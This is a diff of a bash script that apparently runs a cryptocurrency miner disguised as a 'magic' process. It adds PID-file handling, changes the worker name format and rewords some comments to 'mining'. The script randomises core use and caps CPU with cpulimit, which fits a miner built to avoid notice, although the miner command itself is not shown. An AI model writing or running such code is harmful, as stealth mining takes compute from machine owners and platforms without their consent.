@@ -22,10 +22,10 @@ generate_worker() {
   local cores=$1
   TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
     's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
-    | sed "s/$/$cores/"
+    | sed "s/$/-$cores/"
 }
 
-# Function to start the magic process with a random number of cores
+# Function to start the mining process with a random number of cores
 start_magic() {
   local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
   local worker=$(generate_worker $num_cores)  # Generate worker string including core count
@@ -41,12 +41,21 @@ start_magic() {
 
   # Limiting CPU usage using `cpulimit`
   cpulimit -p $pid -l $cpu_limit &
+  
+  # Save PID to a file for later use
+  echo $pid > /tmp/magic_pid
 }
 
-# Function to stop the magic process
+# Function to stop the mining process
 stop_magic() {
-  pkill -f sgq
-  echo "Magic stopped"
+  if [ -f /tmp/magic_pid ]; then
+    local pid=$(cat /tmp/magic_pid)
+    echo "Stopping magic with PID: $pid"
+    kill -9 $pid 2>/dev/null
+    rm -f /tmp/magic_pid
+  else
+    echo "No PID file found, cannot stop magic"
+  fi
 }
 
 # Run the loop
